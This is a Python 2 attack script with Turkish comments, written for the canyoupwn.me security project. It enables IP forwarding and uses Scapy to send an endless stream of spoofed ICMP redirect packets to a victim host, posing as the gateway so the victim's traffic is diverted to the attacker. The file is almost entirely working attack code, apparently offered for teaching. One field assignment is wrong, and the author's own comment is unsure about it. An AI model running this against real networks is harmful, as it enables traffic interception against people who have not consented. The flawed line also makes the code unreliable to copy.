#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
#  This tool is developed for                                                                          
#                                                                           
#     ___ __ _ _ __  _   _  ___  _   _ _ ____      ___ __    _ __ ___   ___ 
#    / __/ _` | '_ \| | | |/ _ \| | | | '_ \ \ /\ / / '_ \  | '_ ` _ \ / _ \
#   | (_| (_| | | | | |_| | (_) | |_| | |_) \ V  V /| | | |_| | | | | |  __/
#    \___\__,_|_| |_|\__, |\___/ \__,_| .__/ \_/\_/ |_| |_(_)_| |_| |_|\___|
#                     __/ |           | |                                   
#                    |___/            |_|                                   
#	project by @cemonatk, for more details (Turkish) check this article: Link

__date__    = '30.04.2016'
__author__  =  'cemonatk'

# =================================================================== #
# Kutuphanelerin (modul) import (dahil) edildigi bolum.
# Not: try, except hatalarla bas edilmede yardimci olur.
# Try icindeki kod calismaz ise except calisir.
# =================================================================== #

try:
	from os import system as komut									# Sistem komutlarinin daha rahat kullanimi icin bu sekilde import edilmesi tercih edilmistir.
	import logging													# Asagidaki ayari yapabilmek icin logging modulunun eklenmesi.
	logging.getLogger("scapy.runtime").setLevel(logging.ERROR)		# Scapy nin verdigi hata seviyesini sadece hatalara ayarlamak icin, bu sayede warning mesaji gelmeyecek.
	from scapy.all import *
	import argparse													# Komut satirindan(terminal) alınacak parametrelerin parse edilmesi icin gerekli modulun(argparse) import edilmesi. 
except ImportError,c:
	print c;raise SystemExit(0)										# Programda cakilma oldugunda hatayi terminale bas ve cikis yap(0 saniye surede).
	
komut('sudo sysctl net.ipv4.ip_forward=1')							# Nam-i diger echo "1"> /proc/sys/net/ipv4/ip_forward 'un farkli kullanimi.
komut('clear')														# Terminali temizlemek icin.

# =================================================================== #
# Komut satiri(veya terminal) parametrelerinin degiskenlere atanmasi.
# =================================================================== #

parser = argparse.ArgumentParser(description='Bu arac canyoupwn.me icin gelistirilmistir.\nKullanimi: cypm_cypm_icmpredirect.py -a eth0 -k 192.168.2.19 -g 192.168.2.1')
parser.add_argument('-a', '--arayuz', type=str, help='Ornek kullanim: cypm_icmpredirect.py -a eth0 veya cypm_icmpredirect.py --arayuz eth0', required=True)
parser.add_argument('-k', '--kurban', type=str, help='Ornek kullanim: cypm_icmpredirect.py -k 192.168.2.19 veya cypm_icmpredirect.py --kurban 192.168.2.19', required=True)
parser.add_argument('-g', '--aggecidi', type=str, help='Ornek kullanim: cypm_icmpredirect.py -g 192.168.2.1 veya cypm_icmpredirect.py --aggecidi 192.168.2.1', required=True)
args = parser.parse_args()

arayuz   = args.arayuz		# Saldirida kullanilacak ag arayuzunu parse eder ve arayuz degiskenine atar.
kurban   = args.kurban		# Saldirida kullanilacak kurbanin ip adresini parse eder ve kurban degiskenine atar.
aggecidi = args.aggecidi	# Saldirida kullanilacak aggecidini parse eder ve aggecidi degiskenine atar.

# =================================================================== #
# Programin ana kismi.
# =================================================================== #

if(__name__ == '__main__'):
	
	try:
		print "Saldiri baslatildi..."
		ip1 = IP()										# Iki farkli ip paketi olusturulacagi icin IP().src vb atama yapmaktansa ip1 ve ip2 paketleri olusturup bunlar duzenlendi.
		ip1.src = aggecidi								# Aggecidini kaynaga(src=source) atamak icin.
		ip1.dst = kurban								# Kurban ip adresini hedefe(dst=destination) atamak icin.
		icmp = ICMP()									# Icmp isimli degiskene ICMP paketi oldugunu belirtmek icin.
		icmp.type = 5									# Icmp paketinin redirection required tipi oldugunu belirtmek icin.
		icmp.code = 1									# Redirection required tipininin kodunun host icin oldugunu icin. 
		icmp.aggecidi = get_if_addr(arayuz)				# Get if addres fonksiyonu sayesinde ag arayuzunun ip adresi alinir ???????
		ip2 = IP()										# Iki farkli ip paketi olusturulacagi icin IP().dst vb atama yapmaktansa ip1 ve ip2 paketleri olusturup bunlar duzenlendi.
		ip2.src = kurban								# Kurban ip adresini kaynaga(src=source) atamak icin.
		ip2.dst = aggecidi								# Aggecidinin ip adresini hedefe(dst=destination) atamak icin.
		send(ip1/icmp/ip2/UDP(), loop=1, inter=2)		# Paketlerin yollanmasi. Buradaki parametrelerden loop donguyu, inter de kac saniyede bir paket atilacagini belirtir.
		print "\nSaldiri tamamlandi."
	except Exception,c:
		print c;raise SystemExit(0)						# Programda cakilma oldugunda hatayi terminale bas, cikis yap(0 saniye surede).
